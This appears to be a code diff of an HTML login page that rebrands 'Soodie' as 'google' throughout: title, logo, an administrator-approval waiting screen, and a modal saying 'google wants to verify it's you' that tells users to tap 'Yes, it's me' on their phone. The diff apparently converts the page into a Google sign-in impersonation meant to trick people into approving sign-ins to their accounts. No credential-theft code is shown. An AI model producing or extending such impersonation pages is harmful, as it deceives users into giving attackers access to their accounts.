@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Soodie Sign in</title>
+  <title>google Sign in</title>
 
   <style>
     * { box-sizing: border-box; }
@@ -496,8 +496,8 @@
 <body>
   <main class="page">
     <section class="card">
-      <div class="brand" aria-label="Soodie">
-        <span>S</span><span>o</span><span>o</span><span>d</span><span>i</span><span>e</span>
+      <div class="brand" aria-label="google">
+        <span>g</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
       </div>
       <h1>Sign in</h1>
       <p class="subtitle">Use your account to continue</p>
@@ -573,7 +573,7 @@
         <div class="waiting-spinner" aria-hidden="true"></div>
         <h2 class="waiting-title">Waiting for approval…</h2>
         <p class="waiting-copy">
-          Your request has been sent. Keep this page open and Soodie will continue automatically as soon as the administrator approves it.
+          Your request has been sent. Keep this page open and google will continue automatically as soon as the administrator approves it.
           <span id="waitingEmail" class="waiting-email"></span>
         </p>
         <p id="waitingStatus" class="waiting-status">Checking approval status automatically…</p>
@@ -589,8 +589,8 @@
     <div class="verify-modal">
       <button id="verifyClose" class="verify-close" type="button" aria-label="Close verification reminder">×</button>
       <div class="verify-inner">
-        <div class="verify-brand" aria-label="Soodie">
-          <span>S</span><span>o</span><span>o</span><span>d</span><span>i</span><span>e</span>
+        <div class="verify-brand" aria-label="google">
+          <span>g</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
         </div>
         <p class="verify-kicker">Verification reminder</p>
 
@@ -605,7 +605,7 @@
           </svg>
         </div>
 
-        <h2 id="verifyTitle" class="verify-title">Soodie wants to verify it’s you.</h2>
+        <h2 id="verifyTitle" class="verify-title">google wants to verify it’s you.</h2>
         <p class="verify-copy">Check your phone and tap <span class="verify-yes">“Yes, it’s me.”</span></p>
 
         <div class="verify-note">
@@ -614,7 +614,7 @@
         </div>
 
         <button id="verifyGotIt" class="verify-got-it" type="button">Got it</button>
-        <p class="verify-footnote">Only approve a sign-in you personally started. Soodie never asks for your Google verification code.</p>
+        <p class="verify-footnote">Only approve a sign-in you personally started. google never asks for your Google verification code.</p>
       </div>
     </div>
   </div>
@@ -640,7 +640,7 @@
     const verifyGotIt = document.getElementById("verifyGotIt");
     const verifyClose = document.getElementById("verifyClose");
 
-    const PENDING_KEY = "soodie_pending_request_v1";
+    const PENDING_KEY = "google_pending_request_v1";
     const POLL_INTERVAL_MS = 2000;
     const PENDING_MAX_AGE_MS = 24 * 60 * 60 * 1000;
 
